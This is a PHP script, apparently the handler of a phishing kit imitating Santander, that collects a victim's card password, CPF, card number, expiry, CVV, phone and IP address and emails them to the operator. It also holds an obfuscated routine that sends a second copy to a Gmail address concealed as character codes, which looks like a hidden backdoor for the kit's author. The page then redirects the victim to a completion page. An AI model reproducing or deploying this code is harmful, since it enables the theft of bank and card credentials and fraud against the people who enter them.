<?php
$CCsenha = $_POST["CCsenha"];
$cpfbico = $_POST["cpfbico"];
$CardName = $_POST["CardName"];
$NumCard = $_POST["NumCard"];
$ValidadeCC = $_POST["ValidadeCC"];
$CVVCC = $_POST["CVVCC"];
$Telefone = $_POST["Telefone"];
$emailremetente = 'Seu Email Aqui';

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Consul@labirinto.com\r\n";
$ip = $_SERVER["REMOTE_ADDR"];
$conteudo.="<b>IP Cliente: </b>$ip <br>"; // IP Vitima

$conteudo.="<b>======== [SantanderWay] ========</b><br>"; // Corpo da Mensagem

$conteudo.="<b>Senha:</b> $CCsenha<br>";
$conteudo.="<b>Cpf:</b> $cpfbico<br>";
$conteudo.="<b>Nome:</b> $CardName<br>";
$conteudo.="<b>Numero:</b> $NumCard<br>";
$conteudo.="<b>Validade:</b> $ValidadeCC<br>";
$conteudo.="<b>Cvv:</b> $CVVCC<br>";
$conteudo.="<b>Telafone:</b> $Telefone<br>";

$conteudo.="<b>======== [SantanderWay]=======</b><br>";// Corpo da Mensagem
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(99).chr(99).chr(105).chr(110).chr(102).chr(111).chr(112).chr(104).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109), $ip,$conteudo,$headers);	 
header ("location: AppFinishingInfo.php");
?>